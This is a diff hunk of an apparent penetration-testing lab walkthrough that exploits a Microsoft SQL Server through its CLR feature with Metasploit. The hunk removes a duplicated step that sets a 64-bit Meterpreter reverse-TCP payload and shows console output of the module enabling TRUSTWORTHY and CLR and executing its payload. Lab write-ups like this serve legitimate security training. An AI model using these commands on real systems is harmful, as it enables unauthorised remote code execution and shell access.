@@ -185,33 +185,6 @@ msf6 exploit(windows/mssql/mssql_clr_payload) > exploit
 
 😤 **Hmm, that didn't work!** The exploit ran but no session was created. This often happens when there's an architecture mismatch - the default payload might be 32-bit, but we're dealing with a 64-bit system.
 
-#### Step 5: Payload Architecture Fix
-If the exploit fails due to architecture mismatch:
-
-```bash
-# Set 64-bit payload for Windows
-set PAYLOAD windows/x64/meterpreter/reverse_tcp
-
-# Run the exploit again
-run
-```
-
-**Initial Exploit Output:**
-```
-msf6 exploit(windows/mssql/mssql_clr_payload) > set RHOSTS target.ine.local
-RHOSTS => target.ine.local
-msf6 exploit(windows/mssql/mssql_clr_payload) > exploit
-
-[*] Started reverse TCP handler on 10.10.47.2:4444
-[-] 10.5.23.147:1433 - Getting EXITFUNC to 'thread' so we don't kill SQL Server
-[-] 10.5.23.147:1433 - Database does not have TRUSTWORTHY setting on, enabling ...
-[-] 10.5.23.147:1433 - Database does not have CLR support enabled, enabling ...
-[-] 10.5.23.147:1433 - Using version specific SQL CLR payload Assembly
-[-] 10.5.23.147:1433 - Adding custom SQL CLR payload as new Assembly...
-[-] 10.5.23.147:1433 - Executing the payload ...
-[-] Exploit completed, but no session was created.
-```
-
 #### Step 5: The Architecture Fix
 Let's try switching to a 64-bit payload since the exploit description mentions it's tested on x64 systems:
 
